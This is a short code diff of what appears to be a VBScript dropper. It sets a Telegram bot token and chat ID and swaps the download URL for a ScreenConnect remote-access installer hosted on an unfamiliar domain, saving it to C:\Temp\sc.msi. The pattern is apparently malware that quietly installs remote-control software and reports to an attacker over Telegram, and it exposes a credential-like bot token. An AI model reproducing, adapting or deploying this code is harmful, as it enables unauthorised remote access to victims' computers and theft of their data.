@@ -3,7 +3,7 @@ Dim BOT_TOKEN, CHAT_ID, PACKAGE_URL, TEMP_PATH, TEMP_DIR
 
 BOT_TOKEN   = "8643735125:AAHi9ESDyzDDu9veWr7mM7GCIPaYwxxOpTo"
 CHAT_ID     = "8345342738"
-PACKAGE_URL = "https://github.com/Brayan-277/ssa1/raw/refs/heads/main/ConnectWiseControl.ClientSetup%20(3).msi"
+PACKAGE_URL = "https://rgbxyzhosting.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=test&c=&c=&c=&c=&c=&c=&c="
 
 TEMP_DIR  = "C:\Temp"
 TEMP_PATH = TEMP_DIR & "\sc.msi"
